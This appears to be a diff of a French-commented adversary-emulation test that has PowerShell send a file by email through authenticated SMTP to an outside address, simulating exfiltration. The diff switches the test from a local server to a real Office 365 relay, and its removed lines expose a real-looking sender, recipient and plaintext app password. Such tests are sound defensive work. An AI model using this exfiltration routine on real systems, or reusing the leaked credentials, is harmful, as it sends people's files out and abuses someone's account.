@@ -12,19 +12,19 @@ atomic_tests:
       smtp_server:
         description: Serveur SMTP à utiliser
         type: string
-        default: "localhost"  # Utilisez "smtp.office365.com" pour Outlook ou un serveur réel
+        default: "smtp.office365.com"  # Utilisez un serveur SMTP réel
       smtp_port:
         description: Port SMTP
         type: integer
-        default: 25  # Utilisez 587 pour Outlook avec SSL
+        default: 587  # Utilisez 587 pour Outlook avec SSL
       sender_email:
         description: Adresse e-mail de l'expéditeur
         type: string
-        default: "victim2025@outlook.fr"
+        default: "votre-email@outlook.fr"  # Remplacez par votre adresse e-mail réelle
       recipient_email:
         description: Adresse e-mail du destinataire
         type: string
-        default: "chaymaoumayma2003@gmail.com"
+        default: "destinataire-email@gmail.com"  # Remplacez par une adresse e-mail réelle
       subject:
         description: Objet de l'e-mail
         type: string
@@ -45,7 +45,7 @@ atomic_tests:
       app_password:
         description: Mot de passe d'application pour l'authentification SMTP
         type: string
-        default: "rbrovpmziiwfwcgg"
+        default: "votre-mot-de-passe-app"  # Remplacez par un mot de passe d'application réel
     executor:
       name: powershell
       elevation_required: false
@@ -60,13 +60,13 @@ atomic_tests:
         $securePassword = ConvertTo-SecureString "#{app_password}" -AsPlainText -Force
         $credential = New-Object System.Management.Automation.PSCredential($senderEmail, $securePassword)
 
-        Write-Host "📧 Envoi d'un email simulé via SMTP..."
+        Write-Host "📧 Envoi d'un email réel via SMTP..."
         try {
-            Send-MailMessage -SmtpServer $smtpServer -Port $smtpPort `
+            Send-MailMessage -SmtpServer $smtpServer -Port $smtpPort -UseSsl `
                 -From $senderEmail -To $recipientEmail `
                 -Subject $subject -Body $body `
                 -Attachments $attachmentPath -Credential $credential -ErrorAction Stop
-            Write-Host "✅ Email simulé envoyé avec succès."
+            Write-Host "✅ Email envoyé avec succès."
         } catch {
             Write-Host "❌ Erreur lors de l'envoi de l'email : $_"
         }
